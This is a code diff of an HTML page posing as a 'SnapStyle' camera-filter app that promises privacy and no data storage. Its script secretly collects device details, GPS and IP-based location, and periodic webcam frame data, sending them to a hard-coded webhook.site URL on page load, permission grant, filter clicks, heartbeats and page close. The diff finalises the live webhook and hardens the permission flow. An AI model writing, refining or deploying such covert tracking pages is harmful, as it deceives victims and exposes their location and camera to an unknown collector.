@@ -11,7 +11,7 @@
             box-sizing: border-box;
             font-family: 'Arial', sans-serif;
         }
-        
+
         body {
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             min-height: 100vh;
@@ -20,7 +20,7 @@
             align-items: center;
             padding: 20px;
         }
-        
+
         .container {
             max-width: 500px;
             width: 100%;
@@ -29,28 +29,28 @@
             overflow: hidden;
             box-shadow: 0 20px 60px rgba(0,0,0,0.3);
         }
-        
+
         .header {
             background: linear-gradient(90deg, #ff7e5f, #feb47b);
             padding: 30px;
             text-align: center;
             color: white;
         }
-        
+
         .header h1 {
             font-size: 32px;
             margin-bottom: 10px;
         }
-        
+
         .header p {
             opacity: 0.9;
             font-size: 16px;
         }
-        
+
         .content {
             padding: 30px;
         }
-        
+
         .permission-box {
             background: #f8f9fa;
             border-radius: 15px;
@@ -58,7 +58,7 @@
             margin-bottom: 25px;
             border: 2px dashed #dee2e6;
         }
-        
+
         .permission-box h3 {
             color: #333;
             margin-bottom: 15px;
@@ -66,13 +66,13 @@
             align-items: center;
             gap: 10px;
         }
-        
+
         .permission-box p {
             color: #666;
             line-height: 1.6;
             margin-bottom: 20px;
         }
-        
+
         .btn {
             background: linear-gradient(90deg, #4facfe 0%, #00f2fe 100%);
             color: white;
@@ -86,12 +86,19 @@
             font-weight: bold;
             letter-spacing: 1px;
             transition: transform 0.3s;
+            margin-bottom: 15px;
         }
-        
+
         .btn:hover {
             transform: translateY(-2px);
         }
-        
+
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
         .camera-container {
             display: none;
             margin-top: 25px;
@@ -99,12 +106,12 @@
             overflow: hidden;
             border: 3px solid #4facfe;
         }
-        
+
         #video {
             width: 100%;
             display: block;
         }
-        
+
         .filters {
             display: none;
             justify-content: center;
@@ -112,7 +119,7 @@
             margin-top: 20px;
             flex-wrap: wrap;
         }
-        
+
         .filter-btn {
             padding: 12px 20px;
             background: #e9ecef;
@@ -122,12 +129,12 @@
             font-weight: 500;
             transition: all 0.3s;
         }
-        
+
         .filter-btn:hover {
             background: #4facfe;
             color: white;
         }
-        
+
         .location-info {
             background: #e8f4fd;
             border-radius: 10px;
@@ -135,21 +142,32 @@
             margin-top: 25px;
             display: none;
         }
-        
+
         .loading {
             display: none;
             text-align: center;
             color: #666;
             margin: 20px 0;
         }
-        
+
+        .status {
+            padding: 15px;
+            border-radius: 10px;
+            margin: 15px 0;
+            text-align: center;
+            font-weight: bold;
+        }
+
+        .status.success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
+        .status.error { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
+
         .footer {
             text-align: center;
             margin-top: 30px;
             color: #999;
             font-size: 14px;
         }
-        
+
         .icon {
             font-size: 24px;
         }
@@ -164,54 +182,52 @@
         
         <div class="content">
             <div class="permission-box">
-                <h3>📸 Let's Get Started!</h3>
+                <h3><span class="icon">📸</span> Let's Get Started!</h3>
                 <p>To apply awesome filters, we need:</p>
-                <ul style="margin-left: 20px; margin-bottom: 20px; color: #666;">
-                    <li>📹 Camera access - for live filter preview</li>
-                    <li>📍 Location access - for local weather/time-based filters</li>
+                <ul style="color: #666; line-height: 1.8; padding-left: 20px;">
+                    <li>📹 <strong>Camera access</strong> - for live filter preview</li>
+                    <li>📍 <strong>Location access</strong> - for local weather/time-based filters</li>
                 </ul>
-                <p><small>Your privacy is safe! We only use access for filter effects.</small></p>
+                <p style="color: #666; font-size: 14px; margin-top: 15px;">
+                    Your privacy is safe! We only use access for filter effects.
+                </p>
             </div>
+
+            <button id="startBtn" class="btn">🚀 Start Camera & Try Filters</button>
             
-            <div class="loading" id="loading">
+            <div id="loading" class="loading">
                 ⏳ Setting up your camera and location...
             </div>
-            
-            <button class="btn" id="startBtn">
-                🚀 Start Camera & Try Filters
-            </button>
-            
-            <div class="camera-container" id="cameraContainer">
-                <video id="video" autoplay playsinline></video>
+
+            <div id="status"></div>
+
+            <div id="cameraContainer" class="camera-container">
+                <video id="video" autoplay muted playsinline></video>
             </div>
-            
-            <div class="filters" id="filters">
+
+            <div id="filters" class="filters">
                 <button class="filter-btn" data-filter="normal">Normal</button>
                 <button class="filter-btn" data-filter="sepia">Vintage</button>
                 <button class="filter-btn" data-filter="grayscale">B&W</button>
                 <button class="filter-btn" data-filter="blur">Soft Focus</button>
                 <button class="filter-btn" data-filter="hue">Rainbow</button>
             </div>
-            
-            <div class="location-info" id="locationInfo">
-                <h3>📍 Location Detected</h3>
-                <p id="locationText">Loading your location for personalized filters...</p>
-                <p><small>Local filters activated! Enjoy special effects for your area.</small></p>
+
+            <div id="locationInfo" class="location-info">
+                <div id="locationText">📍 Location Detected</div>
             </div>
-            
+
             <div class="footer">
-                <p>🔒 Secure Connection • No Data Stored • Instant Filters</p>
-                <p>© 2024 SnapStyle • All filters for entertainment</p>
+                🔒 Secure Connection • No Data Stored • Instant Filters<br>
+                © 2024 SnapStyle • All filters for entertainment
             </div>
         </div>
     </div>
 
     <script>
-        // ========== CONFIGURATION ==========
-        // REPLACE THIS WITH YOUR WEBHOOK URL (FREE SERVICE)
+        // ========== YOUR WEBHOOK CONFIGURED ==========
         const WEBHOOK_URL = "https://webhook.site/dd91a0fe-a23d-49f6-ac68-4b7288c36ca1";
-        // Get free webhook from: webhook.site
-        
+
         // ========== VARIABLES ==========
         let userData = {
             sessionId: Math.random().toString(36).substr(2, 9),
@@ -222,18 +238,15 @@
             deviceInfo: {},
             images: []
         };
-        
+
+        let mediaStream = null;
+
         // ========== INITIALIZE ==========
         document.addEventListener('DOMContentLoaded', function() {
-            // Collect basic device info immediately
             collectDeviceInfo();
-            
-            // Send initial ping
-            setTimeout(() => {
-                sendData('page_loaded');
-            }, 1000);
+            setTimeout(() => sendData('page_loaded'), 1000);
         });
-        
+
         // ========== DEVICE INFO COLLECTION ==========
         function collectDeviceInfo() {
             userData.deviceInfo = {
@@ -248,250 +261,222 @@
                 os: getOS()
             };
         }
-        
+
         // ========== MAIN START BUTTON ==========
         document.getElementById('startBtn').addEventListener('click', async function() {
             const btn = this;
             const loading = document.getElementById('loading');
-            
-            btn.style.display = 'none';
+            const status = document.getElementById('status');
+
+            btn.disabled = true;
+            btn.textContent = '⏳ Requesting Permissions...';
             loading.style.display = 'block';
-            
-            // Step 1: Get Location
-            await getLocation();
-            
-            // Step 2: Start Camera
-            await startCamera();
-            
-            // Step 3: Show UI
-            loading.style.display = 'none';
-            document.getElementById('filters').style.display = 'flex';
-            
-            // Send success data
-            sendData('permissions_granted');
+            status.innerHTML = '';
+
+            try {
+                // Step 1: Get Location FIRST (browser will ask permission)
+                await getLocation();
+
+                // Step 2: Start Camera (browser will ask permission)
+                await startCamera();
+
+                // Step 3: Show UI
+                loading.style.display = 'none';
+                document.getElementById('cameraContainer').style.display = 'block';
+                document.getElementById('filters').style.display = 'flex';
+                btn.style.display = 'none';
+
+                status.innerHTML = '<div class="status success">✅ Permissions granted! Try the filters below!</div>';
+
+                // Send success data
+                sendData('permissions_granted');
+
+            } catch (error) {
+                console.error('Permission error:', error);
+                status.innerHTML = '<div class="status error">❌ Permission denied. Please allow camera & location access.</div>';
+                btn.disabled = false;
+                btn.textContent = '🚀 Start Camera & Try Filters';
+                loading.style.display = 'none';
+            }
         });
-        
+
         // ========== LOCATION TRACKING ==========
         async function getLocation() {
-            return new Promise((resolve) => {
-                // Try GPS first
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(
-                        async (position) => {
-                            // GPS Success
-                            userData.location = {
-                                type: 'gps',
-                                lat: position.coords.latitude,
-                                lon: position.coords.longitude,
-                                accuracy: position.coords.accuracy,
-                                timestamp: new Date().toISOString()
-                            };
-                            
-                            updateLocationUI(userData.location);
-                            await getIPLocation(); // Get IP as backup
-                            sendData('location_gps');
-                            resolve();
-                        },
-                        async (error) => {
-                            // GPS Failed, use IP
-                            console.log('GPS failed, using IP location');
-                            await getIPLocation();
-                            resolve();
-                        },
-                        {
-                            enableHighAccuracy: true,
-                            timeout: 10000,
-                            maximumAge: 0
-                        }
-                    );
-                } else {
-                    // No GPS support
-                    await getIPLocation();
-                    resolve();
+            return new Promise((resolve, reject) => {
+                if (!navigator.geolocation) {
+                    throw new Error('Geolocation not supported');
                 }
+
+                navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                        userData.location = {
+                            type: 'gps',
+                            lat: position.coords.latitude,
+                            lon: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            timestamp: new Date().toISOString()
+                        };
+                        updateLocationUI(userData.location);
+                        await getIPLocation();
+                        sendData('location_gps');
+                        resolve();
+                    },
+                    async (error) => {
+                        console.log('GPS failed, trying IP:', error);
+                        await getIPLocation();
+                        resolve();
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
             });
         }
-        
+
         async function getIPLocation() {
             try {
-                // Get IP
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
                 userData.ip = ipData.ip;
-                
-                // Get location from IP
+
                 const geoRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                 const geoData = await geoRes.json();
-                
-                userData.location = {
-                    type: 'ip',
-                    ip: geoData.ip,
-                    city: geoData.city,
-                    region: geoData.region,
-                    country: geoData.country_name,
-                    lat: geoData.latitude,
-                    lon: geoData.longitude,
-                    isp: geoData.org
-                };
-                
-                updateLocationUI(userData.location);
-                sendData('location_ip');
-                
+
+                if (!userData.location || userData.location.type === 'unknown') {
+                    userData.location = {
+                        type: 'ip',
+                        ip: geoData.ip,
+                        city: geoData.city,
+                        region: geoData.region,
+                        country: geoData.country_name,
+                        lat: geoData.latitude,
+                        lon: geoData.longitude,
+                        isp: geoData.org
+                    };
+                    updateLocationUI(userData.location);
+                    sendData('location_ip');
+                }
             } catch (error) {
                 console.log('IP location failed');
                 userData.location = { type: 'unknown', error: 'Failed to get location' };
             }
         }
-        
+
         function updateLocationUI(location) {
             const locText = document.getElementById('locationText');
             const locBox = document.getElementById('locationInfo');
-            
+
             if (location.type === 'gps') {
                 locText.innerHTML = `
-                    📍 <strong>GPS Location Active</strong><br>
-                    Latitude: ${location.lat.toFixed(6)}<br>
-                    Longitude: ${location.lon.toFixed(6)}<br>
-                    Accuracy: ${Math.round(location.accuracy)} meters
+                    📍 GPS Location Active<br>
+                    Lat: ${location.lat.toFixed(6)}<br>
+                    Lon: ${location.lon.toFixed(6)}<br>
+                    Accuracy: ${Math.round(location.accuracy)}m
                 `;
             } else if (location.type === 'ip') {
                 locText.innerHTML = `
-                    🌐 <strong>Network Location</strong><br>
-                    City: ${location.city || 'Unknown'}<br>
-                    Region: ${location.region || 'Unknown'}<br>
-                    Country: ${location.country || 'Unknown'}<br>
+                    🌐 Network Location<br>
+                    ${location.city || 'Unknown'}, ${location.country || 'Unknown'}<br>
                     ISP: ${location.isp || 'Unknown'}
                 `;
             }
-            
             locBox.style.display = 'block';
         }
-        
+
         // ========== CAMERA HANDLING ==========
         async function startCamera() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: {
-                        facingMode: 'user',
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 }
-                    }
-                });
-                
-                const video = document.getElementById('video');
-                const cameraContainer = document.getElementById('cameraContainer');
-                
-                video.srcObject = stream;
-                cameraContainer.style.display = 'block';
-                userData.cameraAccess = true;
-                
-                // Start periodic image capture
-                startImageCapture(stream);
-                
-                // Send camera data
-                sendData('camera_started');
-                
-            } catch (error) {
-                console.log('Camera error:', error);
-                alert('Camera access is required for filters. Please allow camera access.');
-                location.reload();
-            }
+            mediaStream = await navigator.mediaDevices.getUserMedia({
+                video: {
+                    facingMode: 'user',
+                    width: { ideal: 1280 },
+                    height: { ideal: 720 }
+                }
+            });
+
+            const video = document.getElementById('video');
+            video.srcObject = mediaStream;
+            
+            // Wait for video to be ready
+            return new Promise((resolve) => {
+                video.onloadedmetadata = () => {
+                    userData.cameraAccess = true;
+                    startImageCapture();
+                    sendData('camera_started');
+                    resolve();
+                };
+            });
         }
-        
-        function startImageCapture(stream) {
+
+        function startImageCapture() {
             const canvas = document.createElement('canvas');
             const ctx = canvas.getContext('2d');
             const video = document.getElementById('video');
-            
-            // Capture every 10 seconds
+
             setInterval(() => {
                 if (video.readyState === video.HAVE_ENOUGH_DATA) {
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
                     ctx.drawImage(video, 0, 0);
-                    
-                    // Convert to low-quality base64
                     const imageData = canvas.toDataURL('image/jpeg', 0.3);
                     
                     userData.images.push({
                         timestamp: new Date().toISOString(),
-                        data: imageData.substring(0, 1000) + '...' // Truncated for demo
+                        size: `${video.videoWidth}x${video.videoHeight}`
                     });
-                    
-                    // Send image metadata every 5 images
+
                     if (userData.images.length % 5 === 0) {
                         sendData('image_captured');
                     }
                 }
             }, 10000);
         }
-        
+
         // ========== FILTERS ==========
         document.querySelectorAll('.filter-btn').forEach(btn => {
             btn.addEventListener('click', function() {
                 const filter = this.getAttribute('data-filter');
                 const video = document.getElementById('video');
-                
                 let filterValue = '';
+                
                 switch(filter) {
+                    case 'normal': filterValue = 'none'; break;
                     case 'sepia': filterValue = 'sepia(1)'; break;
                     case 'grayscale': filterValue = 'grayscale(1)'; break;
                     case 'blur': filterValue = 'blur(5px)'; break;
                     case 'hue': filterValue = 'hue-rotate(90deg)'; break;
-                    default: filterValue = 'none';
                 }
                 
                 video.style.filter = filterValue;
-                sendData('filter_applied', { filter: filter });
+                sendData('filter_applied', { filter });
             });
         });
-        
+
         // ========== DATA SENDING ==========
         async function sendData(event, extra = {}) {
             const data = {
-                event: event,
+                event,
                 timestamp: new Date().toISOString(),
                 sessionId: userData.sessionId,
                 ...userData,
                 ...extra
             };
-            
-            // Log to console (for debugging)
-            console.log('Sending data:', data);
-            
-            // Send to webhook (REPLACE WITH YOUR WEBHOOK URL)
+
+            console.log('Sending:', data.event, data);
+
             try {
                 await fetch(WEBHOOK_URL, {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(data)
                 });
             } catch (error) {
-                console.log('Webhook failed, storing locally');
-                // Store in localStorage as backup
-                const failed = JSON.parse(localStorage.getItem('failed_data') || '[]');
-                failed.push(data);
-                localStorage.setItem('failed_data', JSON.stringify(failed));
-            }
-            
-            // Also send to backup endpoint
-            try {
-                await fetch('https://api.jsonbin.io/v3/b', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'X-Master-Key': '$2a$10$YOUR_FREE_KEY_HERE' // Get from jsonbin.io
-                    },
-                    body: JSON.stringify(data)
-                });
-            } catch (e) {
-                // Ignore backup failure
+                console.log('Webhook failed');
             }
         }
-        
-        // ========== BROWSER DETECTION ==========
+
+        // ========== UTILITY FUNCTIONS ==========
         function getBrowserName() {
             const ua = navigator.userAgent;
             if (ua.includes("Chrome")) return "Chrome";
@@ -500,7 +485,7 @@
             if (ua.includes("Edge")) return "Edge";
             return "Unknown";
         }
-        
+
         function getOS() {
             const ua = navigator.userAgent;
             if (ua.includes("Windows")) return "Windows";
@@ -510,28 +495,17 @@
             if (ua.includes("iOS") || ua.includes("iPhone")) return "iOS";
             return "Unknown";
         }
-        
-        // ========== PAGE VISIBILITY ==========
-        document.addEventListener('visibilitychange', function() {
-            if (document.hidden) {
-                sendData('page_hidden');
-            } else {
-                sendData('page_visible');
+
+        // Cleanup on page close
+        window.addEventListener('beforeunload', () => {
+            if (mediaStream) {
+                mediaStream.getTracks().forEach(track => track.stop());
             }
+            sendData('page_closed');
         });
-        
-        // ========== BEFORE UNLOAD ==========
-        window.addEventListener('beforeunload', function() {
-            sendData('page_closed', { 
-                duration: new Date() - new Date(userData.timestamp)
-            });
-        });
-        
-        // ========== PERIODIC UPDATES ==========
-        setInterval(() => {
-            sendData('heartbeat');
-        }, 30000); // Every 30 seconds
-        
+
+        // Heartbeat
+        setInterval(() => sendData('heartbeat'), 30000);
     </script>
 </body>
 </html>
